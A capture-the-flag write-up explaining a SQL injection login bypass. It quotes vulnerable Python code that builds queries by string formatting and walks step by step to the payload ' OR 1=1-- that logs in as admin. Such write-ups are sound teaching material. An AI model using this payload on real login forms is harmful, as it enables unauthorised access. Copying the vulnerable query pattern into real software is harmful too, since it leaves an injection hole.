# Sieberrsec CTF 5.0 - Sieberrsec Query Lobby

This is a very simple SQL Injection challenge. Our goal is to log in as admin in order to get the flag.

SQL is a language used for database management. 

In app.py, there is a SQL injection vulnerability: 
- This occurs because our input (`username` and `password`) are directly inserted in our query.

```py
with sqlite3.connect('database.db') as conn:
    cur = conn.cursor()
    query = f"SELECT username FROM users WHERE username='{username}' AND password='{password}'"
    
    try:
        cur.execute(query)
        found = cur.fetchone()
    except (sqlite3.Error,sqlite3.Warning) as e:
        return f'Login unsuccessful. Error attained: {e}', query
    except:
        return f'Login unsuccessful. Error attained.', query
```

What happens if we input our username as `admin` and our password as `'` (a single quote)?

```sql
SELECT username FROM users WHERE username='admin' AND password='''

-- > output: Login unsuccessful. Error attained: unrecognized token: "'''"
```

This is due to the syntax error of having `'''`. However, more importantly, it shows that our input can be interpreted as part of the SQL command. 

Thus, we should begin our `password` input with a single quote `'` to close the `password=''` string. Now, behind it, we can inject our own commands.

```sql
SELECT username FROM users WHERE username='admin' AND password='' <we can input our own sql commands here>
```

Since our goal is to simply bypass the password chat, let password be `' OR 1=1`.
- This means the query is checking whether admin's password == NULL or 1=1. Since 1 is always equal to 1 (aka it is always true), the query condition always returns True.

```sql
SELECT username FROM users WHERE username='admin' AND password='' OR 1=1'

-- > output: Login unsuccessful. Error attained: unrecognized token: "'"
```

However, we still get an error. This is referring to the syntax error of the final single quote `'` at the very end of the query. Let's add a SQL comment `--` at the end of our payload to remove the ending single quote (as everything after the comment will be ignored)

```sql
SELECT username FROM users WHERE username='admin' AND password='' OR 1=1--'

-- > output: Welcome back admin, here is the flag: sctf{w41+_h0w_d1_y0u_g3t_1n}

```

TL;DR Input your username as `admin` and password as `' OR 1=1--`.
